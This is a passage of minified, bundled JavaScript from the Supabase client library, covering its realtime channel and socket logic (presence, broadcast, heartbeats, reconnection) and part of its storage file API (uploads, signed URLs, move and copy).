                                e(vt.CHANNEL_ERROR, new Error(JSON.stringify(Object.values(v).join(", ") || "error")));
                    })
                    .receive("timeout", () => {
                        e == null || e(vt.TIMED_OUT);
                    });
        }
        return this;
    }
    presenceState() {
        return this.presence.state;
    }
    async track(e, n = {}) {
        return await this.send({ type: "presence", event: "track", payload: e }, n.timeout || this.timeout);
    }
    async untrack(e = {}) {
        return await this.send({ type: "presence", event: "untrack" }, e);
    }
    on(e, n, r) {
        return (
            this.state === re.joined &&
                e === Gr.PRESENCE &&
                (this.socket.log(
                    "channel",
                    `resubscribe to ${this.topic} due to change in presence callbacks on joined channel`
                ),
                this.unsubscribe().then(() => this.subscribe())),
            this._on(e, n, r)
        );
    }
    async send(e, n = {}) {
        var r, s;
        if (!this._canPush() && e.type === "broadcast") {
            const { event: i, payload: o } = e,
                l = {
                    method: "POST",
                    headers: {
                        Authorization: this.socket.accessTokenValue ? `Bearer ${this.socket.accessTokenValue}` : "",
                        apikey: this.socket.apiKey ? this.socket.apiKey : "",
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        messages: [{ topic: this.subTopic, event: i, payload: o, private: this.private }],
                    }),
                };
            try {
                const c = await this._fetchWithTimeout(
                    this.broadcastEndpointURL,
                    l,
                    (r = n.timeout) !== null && r !== void 0 ? r : this.timeout
                );
                return await ((s = c.body) === null || s === void 0 ? void 0 : s.cancel()), c.ok ? "ok" : "error";
            } catch (c) {
                return c.name === "AbortError" ? "timed out" : "error";
            }
        } else
            return new Promise((i) => {
                var o, a, l;
                const c = this._push(e.type, e, n.timeout || this.timeout);
                e.type === "broadcast" &&
                    !(
                        !(
                            (l =
                                (a = (o = this.params) === null || o === void 0 ? void 0 : o.config) === null ||
                                a === void 0
                                    ? void 0
                                    : a.broadcast) === null || l === void 0
                        ) && l.ack
                    ) &&
                    i("ok"),
                    c.receive("ok", () => i("ok")),
                    c.receive("error", () => i("error")),
                    c.receive("timeout", () => i("timed out"));
            });
    }
    updateJoinPayload(e) {
        this.joinPush.updatePayload(e);
    }
    unsubscribe(e = this.timeout) {
        this.state = re.leaving;
        const n = () => {
            this.socket.log("channel", `leave ${this.topic}`), this._trigger(et.close, "leave", this._joinRef());
        };
        this.joinPush.destroy();
        let r = null;
        return new Promise((s) => {
            (r = new Ko(this, et.leave, {}, e)),
                r
                    .receive("ok", () => {
                        n(), s("ok");
                    })
                    .receive("timeout", () => {
                        n(), s("timed out");
                    })
                    .receive("error", () => {
                        s("error");
                    }),
                r.send(),
                this._canPush() || r.trigger("ok", {});
        }).finally(() => {
            r == null || r.destroy();
        });
    }
    teardown() {
        this.pushBuffer.forEach((e) => e.destroy()),
            (this.pushBuffer = []),
            this.rejoinTimer.reset(),
            this.joinPush.destroy(),
            (this.state = re.closed),
            (this.bindings = {});
    }
    async _fetchWithTimeout(e, n, r) {
        const s = new AbortController(),
            i = setTimeout(() => s.abort(), r),
            o = await this.socket.fetch(e, Object.assign(Object.assign({}, n), { signal: s.signal }));
        return clearTimeout(i), o;
    }
    _push(e, n, r = this.timeout) {
        if (!this.joinedOnce)
            throw `tried to push '${e}' to '${this.topic}' before joining. Use channel.subscribe() before pushing events`;
        let s = new Ko(this, e, n, r);
        return this._canPush() ? s.send() : this._addToPushBuffer(s), s;
    }
    _addToPushBuffer(e) {
        if ((e.startTimeout(), this.pushBuffer.push(e), this.pushBuffer.length > Ey)) {
            const n = this.pushBuffer.shift();
            n &&
                (n.destroy(),
                this.socket.log("channel", `discarded push due to buffer overflow: ${n.event}`, n.payload));
        }
    }
    _onMessage(e, n, r) {
        return n;
    }
    _isMember(e) {
        return this.topic === e;
    }
    _joinRef() {
        return this.joinPush.ref;
    }
    _trigger(e, n, r) {
        var s, i;
        const o = e.toLocaleLowerCase(),
            { close: a, error: l, leave: c, join: d } = et;
        if (r && [a, l, c, d].indexOf(o) >= 0 && r !== this._joinRef()) return;
        let f = this._onMessage(o, n, r);
        if (n && !f) throw "channel onMessage callbacks must return the payload, modified or unmodified";
        ["insert", "update", "delete"].includes(o)
            ? (s = this.bindings.postgres_changes) === null ||
              s === void 0 ||
              s
                  .filter((v) => {
                      var y, _, b;
                      return (
                          ((y = v.filter) === null || y === void 0 ? void 0 : y.event) === "*" ||
                          ((b = (_ = v.filter) === null || _ === void 0 ? void 0 : _.event) === null || b === void 0
                              ? void 0
                              : b.toLocaleLowerCase()) === o
                      );
                  })
                  .map((v) => v.callback(f, r))
            : (i = this.bindings[o]) === null ||
              i === void 0 ||
              i
                  .filter((v) => {
                      var y, _, b, g, p, m;
                      if (["broadcast", "presence", "postgres_changes"].includes(o))
                          if ("id" in v) {
                              const w = v.id,
                                  k = (y = v.filter) === null || y === void 0 ? void 0 : y.event;
                              return (
                                  w &&
                                  ((_ = n.ids) === null || _ === void 0 ? void 0 : _.includes(w)) &&
                                  (k === "*" ||
                                      (k == null ? void 0 : k.toLocaleLowerCase()) ===
                                          ((b = n.data) === null || b === void 0 ? void 0 : b.type.toLocaleLowerCase()))
                              );
                          } else {
                              const w =
                                  (p =
                                      (g = v == null ? void 0 : v.filter) === null || g === void 0
                                          ? void 0
                                          : g.event) === null || p === void 0
                                      ? void 0
                                      : p.toLocaleLowerCase();
                              return (
                                  w === "*" ||
                                  w ===
                                      ((m = n == null ? void 0 : n.event) === null || m === void 0
                                          ? void 0
                                          : m.toLocaleLowerCase())
                              );
                          }
                      else return v.type.toLocaleLowerCase() === o;
                  })
                  .map((v) => {
                      if (typeof f == "object" && "ids" in f) {
                          const y = f.data,
                              { schema: _, table: b, commit_timestamp: g, type: p, errors: m } = y;
                          f = Object.assign(
                              Object.assign(
                                  {},
                                  {
                                      schema: _,
                                      table: b,
                                      commit_timestamp: g,
                                      eventType: p,
                                      new: {},
                                      old: {},
                                      errors: m,
                                  }
                              ),
                              this._getPayloadRecords(y)
                          );
                      }
                      v.callback(f, r);
                  });
    }
    _isClosed() {
        return this.state === re.closed;
    }
    _isJoined() {
        return this.state === re.joined;
    }
    _isJoining() {
        return this.state === re.joining;
    }
    _isLeaving() {
        return this.state === re.leaving;
    }
    _replyEventName(e) {
        return `chan_reply_${e}`;
    }
    _on(e, n, r) {
        const s = e.toLocaleLowerCase(),
            i = { type: s, filter: n, callback: r };
        return this.bindings[s] ? this.bindings[s].push(i) : (this.bindings[s] = [i]), this;
    }
    _off(e, n) {
        const r = e.toLocaleLowerCase();
        return (
            this.bindings[r] &&
                (this.bindings[r] = this.bindings[r].filter((s) => {
                    var i;
                    return !(
                        ((i = s.type) === null || i === void 0 ? void 0 : i.toLocaleLowerCase()) === r &&
                        hu.isEqual(s.filter, n)
                    );
                })),
            this
        );
    }
    static isEqual(e, n) {
        if (Object.keys(e).length !== Object.keys(n).length) return !1;
        for (const r in e) if (e[r] !== n[r]) return !1;
        return !0;
    }
    _rejoinUntilConnected() {
        this.rejoinTimer.scheduleTimeout(), this.socket.isConnected() && this._rejoin();
    }
    _onClose(e) {
        this._on(et.close, {}, e);
    }
    _onError(e) {
        this._on(et.error, {}, (n) => e(n));
    }
    _canPush() {
        return this.socket.isConnected() && this._isJoined();
    }
    _rejoin(e = this.timeout) {
        this._isLeaving() ||
            (this.socket._leaveOpenTopic(this.topic), (this.state = re.joining), this.joinPush.resend(e));
    }
    _getPayloadRecords(e) {
        const n = { new: {}, old: {} };
        return (
            (e.type === "INSERT" || e.type === "UPDATE") && (n.new = Bc(e.columns, e.record)),
            (e.type === "UPDATE" || e.type === "DELETE") && (n.old = Bc(e.columns, e.old_record)),
            n
        );
    }
}
const Qo = () => {},
    Hs = { HEARTBEAT_INTERVAL: 25e3, RECONNECT_DELAY: 10, HEARTBEAT_TIMEOUT_FALLBACK: 100 },
    Iy = [1e3, 2e3, 5e3, 1e4],
    Ay = 1e4,
    Ly = `
  addEventListener("message", (e) => {
    if (e.data.event === "start") {
      setInterval(() => postMessage({ event: "keepAlive" }), e.data.interval);
    }
  });`;
class My {
    constructor(e, n) {
        var r;
        if (
            ((this.accessTokenValue = null),
            (this.apiKey = null),
            (this.channels = new Array()),
            (this.endPoint = ""),
            (this.httpEndpoint = ""),
            (this.headers = {}),
            (this.params = {}),
            (this.timeout = Za),
            (this.transport = null),
            (this.heartbeatIntervalMs = Hs.HEARTBEAT_INTERVAL),
            (this.heartbeatTimer = void 0),
            (this.pendingHeartbeatRef = null),
            (this.heartbeatCallback = Qo),
            (this.ref = 0),
            (this.reconnectTimer = null),
            (this.logger = Qo),
            (this.conn = null),
            (this.sendBuffer = []),
            (this.serializer = new Ny()),
            (this.stateChangeCallbacks = { open: [], close: [], error: [], message: [] }),
            (this.accessToken = null),
            (this._connectionState = "disconnected"),
            (this._wasManualDisconnect = !1),
            (this._authPromise = null),
            (this._resolveFetch = (s) => {
                let i;
                return (
                    s
                        ? (i = s)
                        : typeof fetch > "u"
                          ? (i = (...o) =>
                                bs(
                                    async () => {
                                        const { default: a } = await Promise.resolve().then(() => gr);
                                        return { default: a };
                                    },
                                    void 0
                                )
                                    .then(({ default: a }) => a(...o))
                                    .catch((a) => {
                                        throw new Error(
                                            `Failed to load @supabase/node-fetch: ${a.message}. This is required for HTTP requests in Node.js environments without native fetch.`
                                        );
                                    }))
                          : (i = fetch),
                    (...o) => i(...o)
                );
            }),
            !(!((r = n == null ? void 0 : n.params) === null || r === void 0) && r.apikey))
        )
            throw new Error("API key is required to connect to Realtime");
        (this.apiKey = n.params.apikey),
            (this.endPoint = `${e}/${el.websocket}`),
            (this.httpEndpoint = qf(e)),
            this._initializeOptions(n),
            this._setupReconnectionTimer(),
            (this.fetch = this._resolveFetch(n == null ? void 0 : n.fetch));
    }
    connect() {
        if (!(this.isConnecting() || this.isDisconnecting() || (this.conn !== null && this.isConnected()))) {
            if ((this._setConnectionState("connecting"), this._setAuthSafely("connect"), this.transport))
                this.conn = new this.transport(this.endpointURL());
            else
                try {
                    this.conn = _y.createWebSocket(this.endpointURL());
                } catch (e) {
                    this._setConnectionState("disconnected");
                    const n = e.message;
                    throw n.includes("Node.js")
                        ? new Error(`${n}

To use Realtime in Node.js, you need to provide a WebSocket implementation:

Option 1: Use Node.js 22+ which has native WebSocket support
Option 2: Install and provide the "ws" package:

  npm install ws

  import ws from "ws"
  const client = new RealtimeClient(url, {
    ...options,
    transport: ws
  })`)
                        : new Error(`WebSocket not available: ${n}`);
                }
            this._setupConnectionHandlers();
        }
    }
    endpointURL() {
        return this._appendParams(this.endPoint, Object.assign({}, this.params, { vsn: Sy }));
    }
    disconnect(e, n) {
        if (!this.isDisconnecting())
            if ((this._setConnectionState("disconnecting", !0), this.conn)) {
                const r = setTimeout(() => {
                    this._setConnectionState("disconnected");
                }, 100);
                (this.conn.onclose = () => {
                    clearTimeout(r), this._setConnectionState("disconnected");
                }),
                    e ? this.conn.close(e, n ?? "") : this.conn.close(),
                    this._teardownConnection();
            } else this._setConnectionState("disconnected");
    }
    getChannels() {
        return this.channels;
    }
    async removeChannel(e) {
        const n = await e.unsubscribe();
        return this.channels.length === 0 && this.disconnect(), n;
    }
    async removeAllChannels() {
        const e = await Promise.all(this.channels.map((n) => n.unsubscribe()));
        return (this.channels = []), this.disconnect(), e;
    }
    log(e, n, r) {
        this.logger(e, n, r);
    }
    connectionState() {
        switch (this.conn && this.conn.readyState) {
            case Hr.connecting:
                return pn.Connecting;
            case Hr.open:
                return pn.Open;
            case Hr.closing:
                return pn.Closing;
            default:
                return pn.Closed;
        }
    }
    isConnected() {
        return this.connectionState() === pn.Open;
    }
    isConnecting() {
        return this._connectionState === "connecting";
    }
    isDisconnecting() {
        return this._connectionState === "disconnecting";
    }
    channel(e, n = { config: {} }) {
        const r = `realtime:${e}`,
            s = this.getChannels().find((i) => i.topic === r);
        if (s) return s;
        {
            const i = new hu(`realtime:${e}`, n, this);
            return this.channels.push(i), i;
        }
    }
    push(e) {
        const { topic: n, event: r, payload: s, ref: i } = e,
            o = () => {
                this.encode(e, (a) => {
                    var l;
                    (l = this.conn) === null || l === void 0 || l.send(a);
                });
            };
        this.log("push", `${n} ${r} (${i})`, s), this.isConnected() ? o() : this.sendBuffer.push(o);
    }
    async setAuth(e = null) {
        this._authPromise = this._performAuth(e);
        try {
            await this._authPromise;
        } finally {
            this._authPromise = null;
        }
    }
    async sendHeartbeat() {
        var e;
        if (!this.isConnected()) {
            try {
                this.heartbeatCallback("disconnected");
            } catch (n) {
                this.log("error", "error in heartbeat callback", n);
            }
            return;
        }
        if (this.pendingHeartbeatRef) {
            (this.pendingHeartbeatRef = null),
                this.log("transport", "heartbeat timeout. Attempting to re-establish connection");
            try {
                this.heartbeatCallback("timeout");
            } catch (n) {
                this.log("error", "error in heartbeat callback", n);
            }
            (this._wasManualDisconnect = !1),
                (e = this.conn) === null || e === void 0 || e.close(jy, "heartbeat timeout"),
                setTimeout(() => {
                    var n;
                    this.isConnected() || (n = this.reconnectTimer) === null || n === void 0 || n.scheduleTimeout();
                }, Hs.HEARTBEAT_TIMEOUT_FALLBACK);
            return;
        }
        (this.pendingHeartbeatRef = this._makeRef()),
            this.push({ topic: "phoenix", event: "heartbeat", payload: {}, ref: this.pendingHeartbeatRef });
        try {
            this.heartbeatCallback("sent");
        } catch (n) {
            this.log("error", "error in heartbeat callback", n);
        }
        this._setAuthSafely("heartbeat");
    }
    onHeartbeat(e) {
        this.heartbeatCallback = e;
    }
    flushSendBuffer() {
        this.isConnected() &&
            this.sendBuffer.length > 0 &&
            (this.sendBuffer.forEach((e) => e()), (this.sendBuffer = []));
    }
    _makeRef() {
        let e = this.ref + 1;
        return e === this.ref ? (this.ref = 0) : (this.ref = e), this.ref.toString();
    }
    _leaveOpenTopic(e) {
        let n = this.channels.find((r) => r.topic === e && (r._isJoined() || r._isJoining()));
        n && (this.log("transport", `leaving duplicate topic "${e}"`), n.unsubscribe());
    }
    _remove(e) {
        this.channels = this.channels.filter((n) => n.topic !== e.topic);
    }
    _onConnMessage(e) {
        this.decode(e.data, (n) => {
            if (n.topic === "phoenix" && n.event === "phx_reply")
                try {
                    this.heartbeatCallback(n.payload.status === "ok" ? "ok" : "error");
                } catch (c) {
                    this.log("error", "error in heartbeat callback", c);
                }
            n.ref && n.ref === this.pendingHeartbeatRef && (this.pendingHeartbeatRef = null);
            const { topic: r, event: s, payload: i, ref: o } = n,
                a = o ? `(${o})` : "",
                l = i.status || "";
            this.log("receive", `${l} ${r} ${s} ${a}`.trim(), i),
                this.channels.filter((c) => c._isMember(r)).forEach((c) => c._trigger(s, i, o)),
                this._triggerStateCallbacks("message", n);
        });
    }
    _clearTimer(e) {
        var n;
        e === "heartbeat" && this.heartbeatTimer
            ? (clearInterval(this.heartbeatTimer), (this.heartbeatTimer = void 0))
            : e === "reconnect" && ((n = this.reconnectTimer) === null || n === void 0 || n.reset());
    }
    _clearAllTimers() {
        this._clearTimer("heartbeat"), this._clearTimer("reconnect");
    }
    _setupConnectionHandlers() {
        this.conn &&
            ("binaryType" in this.conn && (this.conn.binaryType = "arraybuffer"),
            (this.conn.onopen = () => this._onConnOpen()),
            (this.conn.onerror = (e) => this._onConnError(e)),
            (this.conn.onmessage = (e) => this._onConnMessage(e)),
            (this.conn.onclose = (e) => this._onConnClose(e)));
    }
    _teardownConnection() {
        this.conn &&
            ((this.conn.onopen = null),
            (this.conn.onerror = null),
            (this.conn.onmessage = null),
            (this.conn.onclose = null),
            (this.conn = null)),
            this._clearAllTimers(),
            this.channels.forEach((e) => e.teardown());
    }
    _onConnOpen() {
        this._setConnectionState("connected"),
            this.log("transport", `connected to ${this.endpointURL()}`),
            this.flushSendBuffer(),
            this._clearTimer("reconnect"),
            this.worker ? this.workerRef || this._startWorkerHeartbeat() : this._startHeartbeat(),
            this._triggerStateCallbacks("open");
    }
    _startHeartbeat() {
        this.heartbeatTimer && clearInterval(this.heartbeatTimer),
            (this.heartbeatTimer = setInterval(() => this.sendHeartbeat(), this.heartbeatIntervalMs));
    }
    _startWorkerHeartbeat() {
        this.workerUrl
            ? this.log("worker", `starting worker for from ${this.workerUrl}`)
            : this.log("worker", "starting default worker");
        const e = this._workerObjectUrl(this.workerUrl);
        (this.workerRef = new Worker(e)),
            (this.workerRef.onerror = (n) => {
                this.log("worker", "worker error", n.message), this.workerRef.terminate();
            }),
            (this.workerRef.onmessage = (n) => {
                n.data.event === "keepAlive" && this.sendHeartbeat();
            }),
            this.workerRef.postMessage({ event: "start", interval: this.heartbeatIntervalMs });
    }
    _onConnClose(e) {
        var n;
        this._setConnectionState("disconnected"),
            this.log("transport", "close", e),
            this._triggerChanError(),
            this._clearTimer("heartbeat"),
            this._wasManualDisconnect || (n = this.reconnectTimer) === null || n === void 0 || n.scheduleTimeout(),
            this._triggerStateCallbacks("close", e);
    }
    _onConnError(e) {
        this._setConnectionState("disconnected"),
            this.log("transport", `${e}`),
            this._triggerChanError(),
            this._triggerStateCallbacks("error", e);
    }
    _triggerChanError() {
        this.channels.forEach((e) => e._trigger(et.error));
    }
    _appendParams(e, n) {
        if (Object.keys(n).length === 0) return e;
        const r = e.match(/\?/) ? "&" : "?",
            s = new URLSearchParams(n);
        return `${e}${r}${s}`;
    }
    _workerObjectUrl(e) {
        let n;
        if (e) n = e;
        else {
            const r = new Blob([Ly], { type: "application/javascript" });
            n = URL.createObjectURL(r);
        }
        return n;
    }
    _setConnectionState(e, n = !1) {
        (this._connectionState = e),
            e === "connecting"
                ? (this._wasManualDisconnect = !1)
                : e === "disconnecting" && (this._wasManualDisconnect = n);
    }
    async _performAuth(e = null) {
        let n;
        e ? (n = e) : this.accessToken ? (n = await this.accessToken()) : (n = this.accessTokenValue),
            this.accessTokenValue != n &&
                ((this.accessTokenValue = n),
                this.channels.forEach((r) => {
                    const s = { access_token: n, version: ky };
                    n && r.updateJoinPayload(s),
                        r.joinedOnce && r._isJoined() && r._push(et.access_token, { access_token: n });
                }));
    }
    async _waitForAuthIfNeeded() {
        this._authPromise && (await this._authPromise);
    }
    _setAuthSafely(e = "general") {
        this.setAuth().catch((n) => {
            this.log("error", `error setting auth in ${e}`, n);
        });
    }
    _triggerStateCallbacks(e, n) {
        try {
            this.stateChangeCallbacks[e].forEach((r) => {
                try {
                    r(n);
                } catch (s) {
                    this.log("error", `error in ${e} callback`, s);
                }
            });
        } catch (r) {
            this.log("error", `error triggering ${e} callbacks`, r);
        }
    }
    _setupReconnectionTimer() {
        this.reconnectTimer = new Wf(async () => {
            setTimeout(async () => {
                await this._waitForAuthIfNeeded(), this.isConnected() || this.connect();
            }, Hs.RECONNECT_DELAY);
        }, this.reconnectAfterMs);
    }
    _initializeOptions(e) {
        var n, r, s, i, o, a, l, c, d;
        if (
            ((this.transport = (n = e == null ? void 0 : e.transport) !== null && n !== void 0 ? n : null),
            (this.timeout = (r = e == null ? void 0 : e.timeout) !== null && r !== void 0 ? r : Za),
            (this.heartbeatIntervalMs =
                (s = e == null ? void 0 : e.heartbeatIntervalMs) !== null && s !== void 0 ? s : Hs.HEARTBEAT_INTERVAL),
            (this.worker = (i = e == null ? void 0 : e.worker) !== null && i !== void 0 ? i : !1),
            (this.accessToken = (o = e == null ? void 0 : e.accessToken) !== null && o !== void 0 ? o : null),
            (this.heartbeatCallback = (a = e == null ? void 0 : e.heartbeatCallback) !== null && a !== void 0 ? a : Qo),
            e != null && e.params && (this.params = e.params),
            e != null && e.logger && (this.logger = e.logger),
            ((e != null && e.logLevel) || (e != null && e.log_level)) &&
                ((this.logLevel = e.logLevel || e.log_level),
                (this.params = Object.assign(Object.assign({}, this.params), { log_level: this.logLevel }))),
            (this.reconnectAfterMs =
                (l = e == null ? void 0 : e.reconnectAfterMs) !== null && l !== void 0 ? l : (h) => Iy[h - 1] || Ay),
            (this.encode =
                (c = e == null ? void 0 : e.encode) !== null && c !== void 0 ? c : (h, f) => f(JSON.stringify(h))),
            (this.decode =
                (d = e == null ? void 0 : e.decode) !== null && d !== void 0
                    ? d
                    : this.serializer.decode.bind(this.serializer)),
            this.worker)
        ) {
            if (typeof window < "u" && !window.Worker) throw new Error("Web Worker is not supported");
            this.workerUrl = e == null ? void 0 : e.workerUrl;
        }
    }
}
class fu extends Error {
    constructor(e) {
        super(e), (this.__isStorageError = !0), (this.name = "StorageError");
    }
}
function se(t) {
    return typeof t == "object" && t !== null && "__isStorageError" in t;
}
class Uy extends fu {
    constructor(e, n, r) {
        super(e), (this.name = "StorageApiError"), (this.status = n), (this.statusCode = r);
    }
    toJSON() {
        return { name: this.name, message: this.message, status: this.status, statusCode: this.statusCode };
    }
}
class nl extends fu {
    constructor(e, n) {
        super(e), (this.name = "StorageUnknownError"), (this.originalError = n);
    }
}
var Dy = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
const Gf = (t) => {
        let e;
        return (
            t
                ? (e = t)
                : typeof fetch > "u"
                  ? (e = (...n) =>
                        bs(
                            async () => {
                                const { default: r } = await Promise.resolve().then(() => gr);
                                return { default: r };
                            },
                            void 0
                        ).then(({ default: r }) => r(...n)))
                  : (e = fetch),
            (...n) => e(...n)
        );
    },
    zy = () =>
        Dy(void 0, void 0, void 0, function* () {
            return typeof Response > "u"
                ? (yield bs(() => Promise.resolve().then(() => gr), void 0)).Response
                : Response;
        }),
    rl = (t) => {
        if (Array.isArray(t)) return t.map((n) => rl(n));
        if (typeof t == "function" || t !== Object(t)) return t;
        const e = {};
        return (
            Object.entries(t).forEach(([n, r]) => {
                const s = n.replace(/([-_][a-z])/gi, (i) => i.toUpperCase().replace(/[-_]/g, ""));
                e[s] = rl(r);
            }),
            e
        );
    },
    Fy = (t) => {
        if (typeof t != "object" || t === null) return !1;
        const e = Object.getPrototypeOf(t);
        return (
            (e === null || e === Object.prototype || Object.getPrototypeOf(e) === null) &&
            !(Symbol.toStringTag in t) &&
            !(Symbol.iterator in t)
        );
    };
var Pn = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
const Jo = (t) => t.msg || t.message || t.error_description || t.error || JSON.stringify(t),
    By = (t, e, n) =>
        Pn(void 0, void 0, void 0, function* () {
            const r = yield zy();
            t instanceof r && !(n != null && n.noResolveJson)
                ? t
                      .json()
                      .then((s) => {
                          const i = t.status || 500,
                              o = (s == null ? void 0 : s.statusCode) || i + "";
                          e(new Uy(Jo(s), i, o));
                      })
                      .catch((s) => {
                          e(new nl(Jo(s), s));
                      })
                : e(new nl(Jo(t), t));
        }),
    Vy = (t, e, n, r) => {
        const s = { method: t, headers: (e == null ? void 0 : e.headers) || {} };
        return t === "GET" || !r
            ? s
            : (Fy(r)
                  ? ((s.headers = Object.assign(
                        { "Content-Type": "application/json" },
                        e == null ? void 0 : e.headers
                    )),
                    (s.body = JSON.stringify(r)))
                  : (s.body = r),
              e != null && e.duplex && (s.duplex = e.duplex),
              Object.assign(Object.assign({}, s), n));
    };
function Ss(t, e, n, r, s, i) {
    return Pn(this, void 0, void 0, function* () {
        return new Promise((o, a) => {
            t(n, Vy(e, r, s, i))
                .then((l) => {
                    if (!l.ok) throw l;
                    return r != null && r.noResolveJson ? l : l.json();
                })
                .then((l) => o(l))
                .catch((l) => By(l, a, r));
        });
    });
}
function Mi(t, e, n, r) {
    return Pn(this, void 0, void 0, function* () {
        return Ss(t, "GET", e, n, r);
    });
}
function ct(t, e, n, r, s) {
    return Pn(this, void 0, void 0, function* () {
        return Ss(t, "POST", e, r, s, n);
    });
}
function sl(t, e, n, r, s) {
    return Pn(this, void 0, void 0, function* () {
        return Ss(t, "PUT", e, r, s, n);
    });
}
function Wy(t, e, n, r) {
    return Pn(this, void 0, void 0, function* () {
        return Ss(t, "HEAD", e, Object.assign(Object.assign({}, n), { noResolveJson: !0 }), r);
    });
}
function Kf(t, e, n, r, s) {
    return Pn(this, void 0, void 0, function* () {
        return Ss(t, "DELETE", e, r, s, n);
    });
}
var _e = function (t, e, n, r) {
    function s(i) {
        return i instanceof n
            ? i
            : new n(function (o) {
                  o(i);
              });
    }
    return new (n || (n = Promise))(function (i, o) {
        function a(d) {
            try {
                c(r.next(d));
            } catch (h) {
                o(h);
            }
        }
        function l(d) {
            try {
                c(r.throw(d));
            } catch (h) {
                o(h);
            }
        }
        function c(d) {
            d.done ? i(d.value) : s(d.value).then(a, l);
        }
        c((r = r.apply(t, e || [])).next());
    });
};
const Hy = { limit: 100, offset: 0, sortBy: { column: "name", order: "asc" } },
    Hc = { cacheControl: "3600", contentType: "text/plain;charset=UTF-8", upsert: !1 };
class qy {
    constructor(e, n = {}, r, s) {
        (this.shouldThrowOnError = !1), (this.url = e), (this.headers = n), (this.bucketId = r), (this.fetch = Gf(s));
    }
    throwOnError() {
        return (this.shouldThrowOnError = !0), this;
    }
    uploadOrUpdate(e, n, r, s) {
        return _e(this, void 0, void 0, function* () {
            try {
                let i;
                const o = Object.assign(Object.assign({}, Hc), s);
                let a = Object.assign(
                    Object.assign({}, this.headers),
                    e === "POST" && { "x-upsert": String(o.upsert) }
                );
                const l = o.metadata;
                typeof Blob < "u" && r instanceof Blob
                    ? ((i = new FormData()),
                      i.append("cacheControl", o.cacheControl),
                      l && i.append("metadata", this.encodeMetadata(l)),
                      i.append("", r))
                    : typeof FormData < "u" && r instanceof FormData
                      ? ((i = r),
                        i.append("cacheControl", o.cacheControl),
                        l && i.append("metadata", this.encodeMetadata(l)))
                      : ((i = r),
                        (a["cache-control"] = `max-age=${o.cacheControl}`),
                        (a["content-type"] = o.contentType),
                        l && (a["x-metadata"] = this.toBase64(this.encodeMetadata(l)))),
                    s != null && s.headers && (a = Object.assign(Object.assign({}, a), s.headers));
                const c = this._removeEmptyFolders(n),
                    d = this._getFinalPath(c),
                    h = yield (e == "PUT" ? sl : ct)(
                        this.fetch,
                        `${this.url}/object/${d}`,
                        i,
                        Object.assign({ headers: a }, o != null && o.duplex ? { duplex: o.duplex } : {})
                    );
                return { data: { path: c, id: h.Id, fullPath: h.Key }, error: null };
            } catch (i) {
                if (this.shouldThrowOnError) throw i;
                if (se(i)) return { data: null, error: i };
                throw i;
            }
        });
    }
    upload(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            return this.uploadOrUpdate("POST", e, n, r);
        });
    }
    uploadToSignedUrl(e, n, r, s) {
        return _e(this, void 0, void 0, function* () {
            const i = this._removeEmptyFolders(e),
                o = this._getFinalPath(i),
                a = new URL(this.url + `/object/upload/sign/${o}`);
            a.searchParams.set("token", n);
            try {
                let l;
                const c = Object.assign({ upsert: Hc.upsert }, s),
                    d = Object.assign(Object.assign({}, this.headers), { "x-upsert": String(c.upsert) });
                typeof Blob < "u" && r instanceof Blob
                    ? ((l = new FormData()), l.append("cacheControl", c.cacheControl), l.append("", r))
                    : typeof FormData < "u" && r instanceof FormData
                      ? ((l = r), l.append("cacheControl", c.cacheControl))
                      : ((l = r),
                        (d["cache-control"] = `max-age=${c.cacheControl}`),
                        (d["content-type"] = c.contentType));
                const h = yield sl(this.fetch, a.toString(), l, { headers: d });
                return { data: { path: i, fullPath: h.Key }, error: null };
            } catch (l) {
                if (this.shouldThrowOnError) throw l;
                if (se(l)) return { data: null, error: l };
                throw l;
            }
        });
    }
    createSignedUploadUrl(e, n) {
        return _e(this, void 0, void 0, function* () {
            try {
                let r = this._getFinalPath(e);
                const s = Object.assign({}, this.headers);
                n != null && n.upsert && (s["x-upsert"] = "true");
                const i = yield ct(this.fetch, `${this.url}/object/upload/sign/${r}`, {}, { headers: s }),
                    o = new URL(this.url + i.url),
                    a = o.searchParams.get("token");
                if (!a) throw new fu("No token returned by API");
                return { data: { signedUrl: o.toString(), path: e, token: a }, error: null };
            } catch (r) {
                if (this.shouldThrowOnError) throw r;
                if (se(r)) return { data: null, error: r };
                throw r;
            }
        });
    }
    update(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            return this.uploadOrUpdate("PUT", e, n, r);
        });
    }
    move(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            try {
                return {
                    data: yield ct(
                        this.fetch,
                        `${this.url}/object/move`,
                        {
                            bucketId: this.bucketId,
                            sourceKey: e,
                            destinationKey: n,
                            destinationBucket: r == null ? void 0 : r.destinationBucket,
                        },
                        { headers: this.headers }
                    ),
                    error: null,
                };
            } catch (s) {
                if (this.shouldThrowOnError) throw s;
                if (se(s)) return { data: null, error: s };
                throw s;
            }
        });
    }
    copy(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            try {
                return {
                    data: {
                        path: (yield ct(
                            this.fetch,
                            `${this.url}/object/copy`,
                            {
                                bucketId: this.bucketId,
                                sourceKey: e,
                                destinationKey: n,
                                destinationBucket: r == null ? void 0 : r.destinationBucket,
                            },
                            { headers: this.headers }
                        )).Key,
                    },
                    error: null,
                };
            } catch (s) {
                if (this.shouldThrowOnError) throw s;
                if (se(s)) return { data: null, error: s };
                throw s;
            }
        });
    }
    createSignedUrl(e, n, r) {
        return _e(this, void 0, void 0, function* () {
            try {
                let s = this._getFinalPath(e),
                    i = yield ct(
                        this.fetch,
                        `${this.url}/object/sign/${s}`,
